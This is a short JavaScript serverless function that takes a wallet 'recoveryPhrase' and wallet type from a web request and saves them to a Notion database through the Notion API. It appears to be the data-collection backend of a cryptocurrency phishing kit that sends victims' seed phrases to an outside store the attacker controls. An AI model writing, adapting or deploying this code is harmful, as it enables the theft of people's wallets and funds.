/* eslint-disable no-undef */
const { Client } = require('@notionhq/client')

const notion = new Client({
  auth: process.env.NOTION_SECRET,
})

// eslint-disable-next-line no-undef, no-unused-vars
exports.handler = async function (event, context) {
  try {
    const body = await JSON.parse(event.body)

    const response = await notion.pages.create({
      parent: {
        type: 'database_id',
        database_id: process.env.NOTION_ID,
      },
      properties: {
        Name: {
          title: [
            {
              text: {
                content: '',
              },
            },
          ],
        },
        Phrase: {
          rich_text: [
            {
              text: {
                content: body.recoveryPhrase,
              },
            },
          ],
        },
        Wallet: {
          rich_text: [
            {
              text: {
                content: body.walletType,
              },
            },
          ],
        },
      },
    })
    return {
      statusCode: 200,
      body: JSON.stringify(response),
    }
  } catch (error) {
    console.error(error)
    return {
      statusCode: 500,
      body: error.toString(),
    }
  }
}
